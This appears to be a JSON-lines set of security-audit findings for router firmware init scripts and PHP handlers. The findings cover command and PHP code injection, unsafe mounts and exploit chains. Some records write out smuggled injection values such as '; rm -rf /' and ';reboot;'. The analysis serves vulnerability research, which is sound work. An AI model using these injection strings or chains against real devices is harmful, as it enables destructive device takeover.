{"name": "symlink-portal-share-exploit-chain", "file_path": "etc/init0.d/S90upnpav.sh", "location": "etc/init0.d/S90upnpav.sh", "risk_score": 7.0, "confidence": 7.75, "description": "The startup script creates a symbolic link `/var/portal_share -> /var/tmp/storage`. Trigger condition: Automatically executed during system startup. Risk path: 1) Attacker plants malicious files in the globally writable `/var/tmp/storage` 2) Malicious files are executed when network services (e.g., HTTP) access `/var/portal_share`. Boundary check: No path validation or permission control exists. Potential impact: Combined with web services, this could lead to remote code execution (RCE).", "code_snippet": "#!/bin/sh\nln -s -f /var/tmp/storage /var/portal_share", "link_identifiers": ["/var/tmp/storage", "/var/portal_share", "ln -s"], "notes": "Correlation Discovery: /var/tmp/storage is created in S21usbmount.sh (harmless). Subsequent verification directions: 1) Check the permissions of the /var/tmp/storage directory 2) Analyze whether the www service exposes the /var/portal_share path 3) Search for other components referencing this path (grep -r '/var/portal_share')"}
{"name": "static-html-category_view.php", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 0.0, "confidence": 5.0, "description": "The file is a purely static HTML page with no PHP execution logic. It does not receive or process any external input (no $_GET/$_POST parameters), eliminating risks of missing input validation, command execution, or SQL injection. Page redirection functionality (e.g., redirecting to music.php) is implemented solely via JavaScript. Trigger condition: Directly accessing the page only renders static content and cannot initiate any hazardous operations.", "code_snippet": "<tr onMouseUp=\"location.href='music.php'\">...<!-- [HIDDEN] -->", "link_identifiers": ["category_view.php", "music.php", "photo.php", "movie.php", "doc.php", "location.href"], "notes": "Analyze the target jump files (e.g., music.php/photo.php) to identify potential vulnerabilities. The current file has no security impact, and the analysis can be concluded."}
{"name": "NVRAM[HIDDEN]-dev_uid_lanmac", "file_path": "etc/init.d/S22mydlink.sh", "location": "S22mydlink.sh:10-12", "risk_score": 7.0, "confidence": 7.75, "description": "The script uses the devdata tool for NVRAM read/write operations (dev_uid/lanmac) without validating input values. If an attacker contaminates NVRAM through other vulnerabilities (e.g., HTTP interface vulnerabilities), they can control the $uid/$mac variables. Specific trigger conditions: 1) Attacker tampers with dev_uid or lanmac values in NVRAM; 2) System reboot or service REDACTED_SECRET_KEY_PLACEHOLDER. Boundary check: No filtering or length validation. Security impact: May lead to subsequent command injection (via mydlinkuid) or device identifier tampering, with success probability depending on NVRAM contamination feasibility.", "code_snippet": "uid=`devdata get -e dev_uid`\nmac=`devdata get -e lanmac`\ndevdata set -e dev_uid=$uid", "link_identifiers": ["devdata", "dev_uid", "lanmac", "set -e", "get -e"], "notes": "Verify if the devdata binary safely handles input (recommend subsequent analysis of /devdata)"}
{"name": "[HIDDEN]-MYDLINK_mac", "file_path": "etc/init.d/S22mydlink.sh", "location": "S22mydlink.sh:3,18", "risk_score": 8.0, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "mount -t squashfs $MYDLINK /mydlink\nuid=`mydlinkuid $mac`", "link_identifiers": ["MYDLINK", "mydlinkuid", "mac", "mount", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "[HIDDEN]-erase_nvram", "file_path": "etc/init.d/S22mydlink.sh", "location": "S22mydlink.sh:21-23", "risk_score": 7.5, "confidence": 6.75, "description": "During the initial generation of dev_uid, check for the existence of erase_nvram.sh. If it exists, execute it and trigger a reboot. If an attacker manipulates lanmac causing abnormal $uid generation or directly uploads the erase_nvram.sh file, a forced reboot can be triggered. Trigger conditions: 1) Control the lanmac value to make $uid empty 2) Place erase_nvram.sh under /etc/scripts/. Security impact: Causes denial of service (device reboot), which may escalate to RCE if the content of erase_nvram.sh is controllable.", "code_snippet": "if [ -e \"/etc/scripts/erase_nvram.sh\" ]; then\n\t/etc/scripts/erase_nvram.sh\n\treboot\nfi", "link_identifiers": ["dev_uid", "erase_nvram.sh", "reboot", "lanmac"], "notes": "It is recommended to analyze the content of erase_nvram.sh and the generation logic of mydlinkuid"}
{"name": "service_control-watchdog-S95watchdog", "file_path": "etc/init0.d/S95watchdog.sh", "location": "S95watchdog.sh:1-25", "risk_score": 5.0, "confidence": 6.0, "description": "The S95watchdog.sh script serves as a watchdog service controller, receiving the $1 parameter (start/stop) from the init system to start/terminate three monitoring scripts. Risk points: 1) Insufficient validation of the $1 parameter - invalid parameters only log output without terminating the process (lack of boundary checking) 2) Using 'killall' to terminate processes instead of PIDs risks accidentally killing processes with identical names 3) Inability to verify the security of called scripts (/etc/scripts/*.sh) - if these scripts contain vulnerabilities, they form a complete attack chain. Trigger condition: Attacker needs to control parameter passing in the init system. Actual impact depends on vulnerabilities in the called scripts.", "code_snippet": "case \"$1\" in\n  start)\n    /etc/scripts/wifi_watchdog.sh &\n    ;; \n  stop)\n    killall wifi_watchdog.sh\n    ;;", "link_identifiers": ["$1", "start", "stop", "wifi_watchdog.sh", "noise_watchdog.sh", "xmldb_watchdog.sh", "killall", "/etc/scripts/", "/etc/init0.d/S95watchdog.sh"], "notes": "Critical limitation: Unable to access the /etc/scripts directory to verify called scripts. If permissions are subsequently obtained, priority analysis should focus on: 1) Wireless input handling in wifi_watchdog.sh 2) XML parsing logic in xmldb_watchdog.sh 3) Command injection risks in all scripts. Related record: Similar findings already exist in etc/init0.d/S95watchdog.sh (name=command_execution-watchdog_control-S95watchdog)"}
{"name": "script-udevd-udevstart-call", "file_path": "etc/init.d/S23udevd.sh", "location": "etc/init.d/S23udevd.sh", "risk_score": 0.0, "confidence": 5.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["udevstart", "S23udevd.sh", "init_script"], "notes": "The existing record 'udevstart' has been detected in the associated knowledge base (keyword presence confirmed). Subsequent operation priorities: 1) Immediate analysis of /sbin/udevstart (high-risk component) 2) Inspection of other startup scripts in the etc/init.d directory 3) Verification of interaction paths between udevstart and WAN interfaces/IPC. Potential risks may exist in: device node creation logic, hotplug event handling, environment variable inheritance mechanisms."}
{"name": "command_execution-xmldb-image_sign_injection", "file_path": "etc/init.d/S20init.sh", "location": "S20init.sh:2-4", "risk_score": 7.0, "confidence": 5.5, "description": "Unfiltered external input passed to privileged service: The script reads the configuration file content via `image_sign=$(cat /etc/config/image_sign)` without any filtering or validation, directly using it as the value for the -n parameter of the xmldb service. If an attacker can tamper with the /etc/config/image_sign file (e.g., by gaining write access through another vulnerability), it may trigger parameter injection or buffer overflow vulnerabilities. Trigger conditions: 1) The configuration file is tampered with 2) System reboot or service reload. Actual impact depends on how the xmldb service processes the -n parameter.", "code_snippet": "image_sign=$(cat /etc/config/image_sign)\nxmldb -d -n $image_sign -t > /dev/console", "link_identifiers": ["image_sign", "/etc/config/image_sign", "xmldb", "-n"], "notes": "Follow-up verification required: 1) xmldb binary's handling of the -n parameter 2) Writable status of /etc/config/image_sign file (related file attribute analysis)"}
{"name": "privilege_escalation-root_service_chain", "file_path": "etc/init.d/S20init.sh", "location": "S20init.sh:4-7", "risk_score": 6.5, "confidence": 6.5, "description": "REDACTED_PASSWORD_PLACEHOLDER-privileged service chain lacks isolation mechanism: The scripts sequentially launch xmldb (database), servd (main daemon process), dbload.sh (database loading), and LOGD (log service), all running with REDACTED_PASSWORD_PLACEHOLDER privileges and without isolation controls. If any service has vulnerabilities (e.g., LOGD's IPC mechanism flaw), attackers can escalate privileges by disrupting inter-service communication. Trigger condition: Attackers can exploit service vulnerabilities and control service interaction processes.", "code_snippet": "servd -d schedule_off > /dev/console 2>&1 &\n/etc/scripts/dbload.sh\nservice LOGD start", "link_identifiers": ["xmldb", "servd", "dbload.sh", "LOGD", "service LOGD start"], "notes": "Association Analysis: 1) IPC Implementation of LOGD Service (Associated with IPC Analysis Records) 2) Database Loading Logic of dbload.sh"}
{"name": "command_execution-HTTP_config-password_operation", "file_path": "etc/services/HTTP.php", "location": "HTTP.php:10-28", "risk_score": 7.5, "confidence": 7.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["fwrite", "START", "STOP", "httpd", "xmldbc", "widget", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA", "HTTP_config_generator"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "exploit_chain-gpiod_wanindex_injection", "file_path": "etc/init.d/S45gpiod.sh", "location": "etc/init.d/S45gpiod.sh", "risk_score": 8.5, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["gpiod", "-w", "wanidx", "xmldbc", "REDACTED_SENSITIVE_DATA", "NVRAM"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "RCE-HTTP-Parameter-Injection-form_portforwarding", "file_path": "htdocs/mydlink/form_portforwarding", "location": "form_portforwarding:25-36", "risk_score": 9.5, "confidence": 8.25, "description": "Unvalidated HTTP parameters leading to remote code execution vulnerability: Attackers inject PHP code via POST parameters (e.g., enabled_X). Trigger conditions: 1) Accessing the form_portforwarding endpoint 2) Setting settingsChanged=1 3) Including malicious code in parameters like enabled_X. Trigger steps: a) The script writes unfiltered $_POST parameters to /tmp/form_portforwarding.php b) The file gets included and executed via dophp('load'). High exploitation probability (8.5/10) due to direct parameter control and confirmed dophp behavior equivalent to include.", "code_snippet": "fwrite('a', $tmp_file, \"$enable = $_POST[\\\"enabled_\\\".$i.\\\"];\\n\");\n...\ndophp('load', $tmp_file);", "link_identifiers": ["dophp", "load", "$_POST", "fwrite", "$tmp_file", "/tmp/form_portforwarding.php", "settingsChanged"], "notes": "Constraints: The $tmp_file path is fixed as /tmp/form_portforwarding.php. Boundary check: No input filtering. Suggested follow-up validation: 1) Whether the $tmp_file path is absolutely fixed 2) PHP environment configuration (e.g., allow_url_include) 3) Related discovery of /phplib/dophp implementation (currently inaccessible)"}
{"name": "command_execution-mount_config-S10init.sh_ramfs", "file_path": "etc/init.d/rcS", "location": "S10init.sh", "risk_score": 7.5, "confidence": 6.5, "description": "During system startup, the /var directory is mounted as a ramfs filesystem via S10init.sh without the noexec flag set. If an attacker can write files to /var (e.g., through log injection or temporary file vulnerabilities), arbitrary code execution can be achieved for privilege escalation. Trigger conditions: 1) Existence of /var directory write vulnerabilities 2) Attacker can trigger execution of malicious files. Boundary check: ramfs has no size limit, which may lead to DoS.", "code_snippet": "mount -t ramfs ramfs /var", "link_identifiers": ["mount", "/var", "ramfs", "S10init.sh"], "notes": "Follow-up verification required: 1) Actual writable interfaces of the /var directory 2) Whether there exists an automatic execution mechanism for files in the /var directory. Related hint: The knowledge base already contains operations related to /var (e.g., /var/run/exec.sh), which may form a file write-execute exploitation chain."}
{"name": "command_execution-mount_dynamic-S22mydlink.sh_MYDLINK", "file_path": "etc/init.d/rcS", "location": "S22mldlink.sh", "risk_score": 6.0, "confidence": 6.0, "description": "S22mydlink.sh attempts to mount squashfs but depends on the undefined variable $MYDLINK. If this variable can be controlled through environment variables/NVRAM, attackers could mount malicious filesystems. Trigger conditions: 1) $MYDLINK source is unprotected 2) attackers can tamper with this variable. Potential impact: achieving persistent infection or bypassing security mechanisms.", "code_snippet": "mount -t squashfs $MYDLINK /mydlink", "link_identifiers": ["MYDLINK", "mount", "squashfs", "S22mydlink.sh"], "notes": "Critical follow-up: 1) Trace the definition location of $MYDLINK 2) Inspect NVRAM/env related operations. Relevant hint: The knowledge base already contains MYDLINK keywords and NVRAM operations, requiring verification of variable contamination paths."}
{"name": "cmd-injection-iptables-chain", "file_path": "REDACTED_SENSITIVE_DATA", "location": "IPTABLES.php:42-58, IPTABLES/iptlib.php:9-13", "risk_score": 9.5, "confidence": 8.5, "description": "High-risk command injection vulnerability chain: Input point writes to the uid field in /etc/config/nat via the web interface/NVRAM configuration â†’ Propagation path: uid â†’ IPTABLES.php â†’ IP_newchain() â†’ Concatenates iptables command â†’ Unfiltered uid directly concatenated into system-privileged command (iptables -N). Trigger condition: Firewall rule reload triggered after modifying NAT configuration. Attackers can inject ';reboot;' to achieve device control.", "code_snippet": "foreach (\"/nat/entry\") {\n  $uid = query(\"uid\");\n  IPT_newchain($START, \"nat\", \"PRE.MASQ.\".$uid);\n}\n\nfunction IPT_newchain($S,$tbl,$name) {\n  fwrite(\"a\",$S, \"iptables -t \".$tbl.\" -N \".$name.\"\\n\");\n}", "link_identifiers": ["/etc/config/nat", "uid", "IPT_newchain", "iptables -N", "fwrite"], "notes": "command_execution"}
{"name": "cmd-injection-ipt-saverun", "file_path": "REDACTED_SENSITIVE_DATA", "location": "IPTABLES/iptlib.php: IPT_saverun[HIDDEN]", "risk_score": 8.5, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "function IPT_saverun($S,$script) {\n  fwrite(\"a\",$S, \"[ -f \".$script.\" ] && \".$script.\"\\n\");\n}", "link_identifiers": ["IPT_saverun", "$script", "REDACTED_SENSITIVE_DATA", "fwrite"], "notes": "command_execution"}
{"name": "xnode-validation-failure", "file_path": "REDACTED_SENSITIVE_DATA", "location": "[HIDDEN]: XNODE_getpathbytarget[HIDDEN]", "risk_score": 6.0, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "", "link_identifiers": ["XNODE_getpathbytarget", "$ifname", "xnode.php"], "notes": "User needs to provide an accurate path or expand the search scope; relevant knowledge base current keywords: XNODE_getpathbytarget, $ifname"}
{"name": "exploit_chain-MYDLINK_full_compromise", "file_path": "etc/init.d/rcS", "location": "[HIDDEN]NVRAMâ†’S22mydlink.shâ†’etc/profile", "risk_score": 9.0, "confidence": 7.5, "description": "Full attack chain: The attacker pollutes the NVRAM lanmac value â†’ controls the $MYDLINK variable â†’ mounts a malicious squashfs to /mydlink â†’ achieves arbitrary code execution via PATH environment variable injection. Trigger steps: 1) Tamper with lanmac (requires network interface vulnerability) 2) Trigger S22mydlink.sh mount 3) Wait for the system to execute the malicious program in PATH. Success probability: Medium (requires meeting 3 conditions).", "code_snippet": "uid=`mydlinkuid $mac`\nmount -t squashfs $MYDLINK /mydlink\nPATH=$PATH:/mydlink", "link_identifiers": ["MYDLINK", "PATH", "mount", "squashfs", "NVRAM", "lanmac", "exploit_chain"], "notes": "exploit_chain:  \n1) Unauthenticated Mount - MYDLINK_mac (Contamination Source)  \n2) env_set - PATH Expansion Vulnerability (Attack Surface Expansion)"}
{"name": "configuration_load-email_setting-password_plaintext", "file_path": "htdocs/mydlink/form_emailsetting", "location": "form_emailsetting:15", "risk_score": 8.0, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["$_POST['REDACTED_PASSWORD_PLACEHOLDER']", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-email_setting-unvalidated_config", "file_path": "htdocs/mydlink/form_emailsetting", "location": "form_emailsetting:5-30", "risk_score": 8.5, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "$LogServerIPAddr = $_POST['config.log_syslog_addr'];\nset($LOGP.'/ipv4/ipaddr', $LogServerIPAddr);", "link_identifiers": ["$LogServerIPAddr=$_POST['config.log_syslog_addr']", "REDACTED_SENSITIVE_DATA", "set($LOGP.'/ipv4/ipaddr', $LogServerIPAddr)", "set($SMTPP.'/smtp/server', $REDACTED_SECRET_KEY_PLACEHOLDER)", "REDACTED_SENSITIVE_DATA"], "notes": "Pending further verification: 1) Whether syslogd uses this node value to construct commands 2) Whether the node value is used in the PHP mail() function"}
{"name": "command_execution-event_handler-testmail_injection", "file_path": "htdocs/mydlink/form_emailsetting", "location": "form_emailsetting:39, libservice.php:9", "risk_score": 9.0, "confidence": 7.0, "description": "The event-triggered mechanism introduces command injection risks: The MYDLINK_TESTMAIL event is triggered when $_POST['config.smtp_email_action']=='true'. Analysis of libservice.php reveals a command injection vulnerability in the runservice() function (the $cmd parameter is directly concatenated into the 'service' command without filtering). Trigger conditions: 1) The MYDLINK_TESTMAIL event calls runservice() 2) The $cmd parameter contains user-controllable data. Constraints: Requires establishing a call chain from the event to runservice(). Security impact: If tainted data flows into $cmd, remote command execution can be achieved.", "code_snippet": "if($SMTPEmailAction=='true') event('MYDLINK_TESTMAIL');\n// libservice.php:\nfunction runservice($cmd){ addevent('PHPSERVICE','service '.$cmd.' &'); }", "link_identifiers": ["MYDLINK_TESTMAIL", "event('MYDLINK_TESTMAIL')", "runservice($cmd)", "addevent('PHPSERVICE','service '.$cmd.' &')", "$_POST['config.smtp_email_action']"], "notes": "Critical validation missing: 1) Whether MYDLINK_TESTMAIL invokes runservice() 2) Whether user-controllable parameters are passed to $cmd. Recommend subsequent analysis of the event scheduling mechanism."}
{"name": "command_execution-opt.local-argv_control", "file_path": "mydlink/opt.local", "location": "opt.local:3-5", "risk_score": 2.0, "confidence": 6.0, "description": "The process operation (start/stop/restart) is controlled via command-line parameter $1, which only accepts predefined commands but lacks illegal parameter handling. Trigger condition: executing `/mydlink/opt.local [action]` with REDACTED_PASSWORD_PLACEHOLDER privileges. Potential risk: attackers may disrupt process management logic if able to inject additional parameters. Boundary check: case statement restricts valid commands but has no error handling mechanism.", "code_snippet": "action=$1\nend=$2\ncase $action in", "link_identifiers": ["action=$1", "case $action", "/mydlink/opt.local stop"]}
{"name": "command_execution-opt.local-signacle_integrity", "file_path": "mydlink/opt.local", "location": "opt.local:9,15,25,28", "risk_score": 6.5, "confidence": 6.75, "description": "Directly invoking the /mydlink/signacle process without verifying binary integrity: 1) The start/restart branch launches signalc in the background. 2) The stop/restart branch forcibly terminates the process. Trigger condition: Script management operations. Risk: If signacle is replaced with a malicious binary, execution with REDACTED_PASSWORD_PLACEHOLDER privileges will lead to code execution. Exploitation chain: Requires combining with a file upload vulnerability to overwrite the signacle file.", "code_snippet": "/mydlink/signalc > /dev/null 2>&1 &\nkillall -9 signalc\nkillall -9 tsa", "link_identifiers": ["/mydlink/signalc", "killall -9 signalc", "killall -9 tsa"], "notes": "Verify the file permissions and integrity protection mechanism of the signacle file; related unanalyzed components: /mydlink/signalc and /mydlink/tsa"}
{"name": "file_operation-opt.local-symlink_risk", "file_path": "mydlink/opt.local", "location": "opt.local:7", "risk_score": 7.0, "confidence": 7.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "rm /tmp/provision.conf", "link_identifiers": ["rm /tmp/provision.conf"]}
{"name": "exploit_chain-httpd_var_execution", "file_path": "etc/init.d/rcS", "location": "[HIDDEN]sbin/httpdâ†’S10init.sh", "risk_score": 9.0, "confidence": 7.75, "description": "exploit_chain: The attacker leverages the httpd command injection vulnerability to write malicious files to the /var directory â†’ achieves arbitrary code execution via the ramfs mounting feature of S10init.sh. Trigger steps: 1) Sends a malicious HTTP request to inject file write commands 2) Activates the file execution mechanism (requires additional verification). Success probability: High (httpd runs with REDACTED_PASSWORD_PLACEHOLDER privileges, /var is writable and executable).", "code_snippet": "sym.imp.execve(piVar3[-6], piVar3[-7], piVar3[-8]);  // [HIDDEN]\nmount -t ramfs ramfs /var  // [HIDDEN]noexec[HIDDEN]", "link_identifiers": ["httpd", "/var", "command_injection", "ramfs", "execve", "exploit_chain"], "notes": "exploit_chain: 1) command_execution-mount_config-S10init.sh_ramfs (execution environment) 2) network_input-httpd-command_injection-fcn000158c4 (source of contamination)"}
{"name": "exploit_chain-email_setting-credential_theft", "file_path": "htdocs/mydlink/form_emailsetting", "location": "form_emailsetting:15, REDACTED_PASSWORD_PLACEHOLDER_PASSWORD_PLACEHOLDER", "risk_score": 9.0, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_PASSWORD_PLACEHOLDER"], "notes": "Correlation Discovery: configuration_load-email_setting-password_plaintext (storage) + network_input-REDACTED_PASSWORD_PLACEHOLDER-REDACTED_PASSWORD_PLACEHOLDER_exposure (read)"}
{"name": "file_write-HTTP.php-config_generation", "file_path": "etc/services/HTTP.php", "location": "HTTP.php ([HIDDEN])", "risk_score": 0.5, "confidence": 4.9, "description": "HTTP.php serves as a static service configuration script and does not process any HTTP request inputs: 1) All operational parameters are hardcoded values (such as httpd_conf paths); 2) The system/exec call parameters in the generated script are entirely internally controllable; 3) There are no external input propagation paths. Consequently, there is no risk of missing input validation or tainted data flowing to hazardous operations.", "code_snippet": "fwrite(\"a\",$START, \"httpd -f \".$httpd_conf.\"\\n\");\nfwrite(\"a\",$STOP, \"killall httpd\\n\");", "link_identifiers": ["fwrite", "xmldbc", "$httpd_conf", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command-execution-iptables-chain-creation", "file_path": "REDACTED_SENSITIVE_DATA", "location": "iptlib.php: multiple locations", "risk_score": 9.0, "confidence": 8.5, "description": "Multiple functions are at risk of command injection: external parameters ($name/$script/$value/$app) are directly concatenated into shell commands (e.g., 'iptables -N $name') without filtering. Trigger condition: an attacker controls the parameter value to inject malicious commands (e.g., '; rm -rf /'). When the generated iptables script is executed, it can lead to remote code execution. The lack of boundary checks allows attackers to construct commands of arbitrary length.", "code_snippet": "fwrite(\"a\",$S, \"iptables -N \".$name.\"\\n\");\nfwrite(\"a\",$S, \"killall \".$app.\"\\n\");", "link_identifiers": ["IPT_newchain", "IPT_saverun", "IPT_killall", "$name", "$script", "$app", "fwrite", "echo", "killall"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "file-write-iptables-setfile", "file_path": "REDACTED_SENSITIVE_DATA", "location": "iptlib.php: function IPT_setfile", "risk_score": 8.5, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "fwrite(\"a\",$S, \"echo \\\"\".$value.\"\\\" > \".$file.\"\\n\");", "link_identifiers": ["IPT_setfile", "$file", "$value", "fwrite", "echo"], "notes": "Combining command injection can form an attack chain: first writing a malicious script and then executing it. The knowledge base associates '$file' with file operations such as /form_macfilter.php."}
{"name": "config-injection-iptables-inbound-filter", "file_path": "REDACTED_SENSITIVE_DATA", "location": "iptlib.php: function IPT_build_inbound_filter", "risk_score": 7.0, "confidence": 7.0, "description": "The IPT_build_inbound_filter function has a configuration injection vulnerability: the startip/endip values of the iprange node are directly concatenated into iptables rules (--src-range) without validation. Attackers can inject malicious network rules (such as opening arbitrary ports) by tampering with configuration data.", "code_snippet": "fwrite(\"a\",$start_path, \"iptables -t nat -I CK_INBOUND\".$inbf.\" -m iprange --src-range \".$iprange.\" -j RETURN \".\"\\n\");", "link_identifiers": ["IPT_build_inbound_filter", "iprange", "query(\"startip\")", "query(\"endip\")", "--src-range"], "notes": "Risk depends on NVRAM/config storage security. The filtering mechanism for configuration write interfaces needs to be checked. The keyword 'query' relates to NVRAM operations in the knowledge base."}
{"name": "network_input-form_wansetting-http_config_injection", "file_path": "htdocs/mydlink/form_wansetting", "location": "htdocs/mydlink/form_wansetting", "risk_score": 9.0, "confidence": 4.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["$_POST", "settingsChanged", "WANType", "set", "config.wan_ip_mode", "config.pppoe_password", "$WAN1"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-form_wansetting-mac_boundary_vuln", "file_path": "htdocs/mydlink/form_wansetting", "location": "form_wansetting:62-64", "risk_score": 7.0, "confidence": 4.5, "description": "MAC address construction boundary flaw may cause configuration anomalies. When the mac_clone parameter length is less than 12 characters, the substr operation generates malformed MAC addresses (e.g., 'AA:BB::') and writes them to the $WAN1PHYINPF configuration. Trigger condition: submitting short MAC parameters (e.g., 'AABBCC'). Actual impact: 1) Network interface failure (denial of service) 2) Malformed MAC may trigger downstream parsing vulnerabilities. Exploitation probability: Medium (requires specific parameters to trigger).", "code_snippet": "if($MACClone!=\"\"){\n  $MAC = substr($MACClone,0,2).\":\".substr($MACClone,2,2).\":\"...\n  set($WAN1PHYINFP.\"/macaddr\", $MAC);\n}", "link_identifiers": ["$_POST['mac_clone']", "substr", "$MAC", "$WAN1PHYINPF.'/macaddr'", "$WAN1", "substr"], "notes": "The actual impact needs to be analyzed in conjunction with the set() function. Related existing notes: Specific HTTP endpoints and parameter names need to be verified; Suggested test: Submit a 10-character mac_clone to observe system logs."}
{"name": "cmd_injection-SENDMAIL-email_config", "file_path": "etc/events/SENDMAIL.php", "location": "etc/events/SENDMAIL.php", "risk_score": 8.5, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["$ACTION", "$from", "$REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_SENSITIVE_DATA", "$email_addr", "REDACTED_SENSITIVE_DATA", "email -i", "DUMPLOG_append_to_file", "/var/run/logfull.log"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "configuration_load-device_layout-reboot_bypass", "file_path": "etc/events/reboot.sh", "location": "reboot.sh:15", "risk_score": 7.0, "confidence": 7.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["xmldbc", "REDACTED_SENSITIVE_DATA", "reboot", "router"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command_execution-reboot-privilege_ops", "file_path": "etc/events/reboot.sh", "location": "reboot.sh:17-23", "risk_score": 6.0, "confidence": 6.0, "description": "High-risk privileged operations lack protective mechanisms: directly invoking system-level reboot commands to perform forced restarts, combined with privileged operations such as killall radvd and service stop. These operations: 1) lack pre-state validation (e.g., service runtime status checks); 2) have no exception handling mechanisms; 3) may expand the scope of damage in abnormal workflows. When combined with input validation flaws, attackers can construct an exploit chain using illegal layout values â†’ bypass service shutdown â†’ directly trigger forced reboots.", "code_snippet": "reboot\n...\nkillall radvd\nservice INET.WAN-2 stop\nservice INET.WAN-1 stop", "link_identifiers": ["reboot", "killall", "radvd", "service", "INET.WAN-1", "INET.WAN-2"]}
{"name": "file_read-db_saving-delay_reboot", "file_path": "etc/events/reboot.sh", "location": "reboot.sh:8-13", "risk_score": 4.0, "confidence": 6.0, "description": "Incomplete protection mechanism: Delays restart (up to 5 seconds) by checking the existence of the /var/run/db_saving file, but has three flaws: 1) No verification of file content authenticity; 2) No exception handling process after timeout; 3) No input boundary checking. Attackers can perform delay attacks (DoS) by creating fake db_saving files, but the actual impact is limited due to fixed waiting cycles.", "code_snippet": "if [ -f \"/var/run/db_saving\" ]; then\n    for i in 1 2 3 4 5; do\n        ...\n    done\nfi", "link_identifiers": ["/var/run/db_saving", "db_saving"]}
{"name": "exploit_chain-REDACTED_PASSWORD_PLACEHOLDER_command_injection", "file_path": "etc/events/SENDMAIL.php", "location": "[HIDDEN]: htdocs/mydlink/form_emailsetting + etc/events/SENDMAIL.php", "risk_score": 9.0, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["$_POST['REDACTED_PASSWORD_PLACEHOLDER']", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA", "email -i", "SENDMAIL.php"], "notes": "Verify the complete feasibility of the attack chain. Additional analysis required: 1) Whether web authentication mechanisms can be bypassed 2) The minimum time interval for log trigger conditions"}
{"name": "multiple_risks-DHCP4_RENEW-udhcpc_pid_handling", "file_path": "etc/events/DHCP4-RENEW.sh", "location": "etc/events/DHCP4-RENEW.sh:3-6", "risk_score": 7.5, "confidence": 6.0, "description": "1) Path Traversal Risk: The script directly concatenates the unvalidated $1 parameter (interface name) into the PID file path (/var/servd/$1-udhcpc.pid). If an attacker controls $1 to inject path traversal characters (e.g., '../tmp/evil'), arbitrary file manipulation becomes possible. Trigger Condition: A malicious entity controls the $1 parameter through the event triggering mechanism.  \n\n2) Command Injection Risk: The PID variable read from the file is used unquoted in the kill command (kill -SIGUSR1 $PID). If the PID file is tampered with to contain malicious strings (e.g., '123; rm -rf /'), arbitrary command execution may occur. Trigger Condition: The attacker must first modify the PID file contents.", "code_snippet": "pidfile=\"/var/servd/$1-udhcpc.pid\"\nPID=`cat $pidfile`\nkill -SIGUSR1 $PID", "link_identifiers": ["$1", "pidfile", "PID", "kill", "SIGUSR1", "udhcpc.pid", "/var/servd"], "notes": "Correlation Findings: 1) command_injection-watch_dog-script_param (Command injection via $1 parameter) 2) command-injection-watch-dog-path (Path injection via $1). Special verification required: a) How DHCP client writes pid files b) Permissions of /var/servd directory c) Check source filtering of $1 parameter when init system calls this script."}
{"name": "command_execution-ppp_ipup_script-7", "file_path": "etc/scripts/ip-up", "location": "ip-up:7", "risk_score": 9.5, "confidence": 8.5, "description": "The positional parameter $1 is directly concatenated into the script path and executed as an sh command without filtering, creating a command injection vulnerability. Trigger condition: When a PPP connection is established, the system calls the ip-up script while an attacker controls the $1 parameter value (e.g., setting it to a malicious string like 'a;reboot'). The absence of any boundary checks or filtering mechanisms allows attackers to execute arbitrary commands and gain full control of the device.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["$1", "/var/run/ppp4_ipup_$1.sh", "sh", "xmldbc"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "parameter_validation-ppp_ipup_script-6", "file_path": "etc/scripts/ip-up", "location": "ip-up:6", "risk_score": 7.0, "confidence": 8.0, "description": "All positional parameters ($1-$6) have no filtering mechanisms implemented. The $6 parameter (PARAM) is directly passed to the ppp4_ipup.php script. Although it is not directly executed in ip-up, there exists a secondary risk dependent on downstream processing. Trigger condition: An attacker controls any positional parameter to deliver malicious data.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["$1", "$2", "$3", "$4", "$5", "$6", "PARAM", "ppp4_ipup.php"], "notes": "REDACTED_SENSITIVE_DATA"}
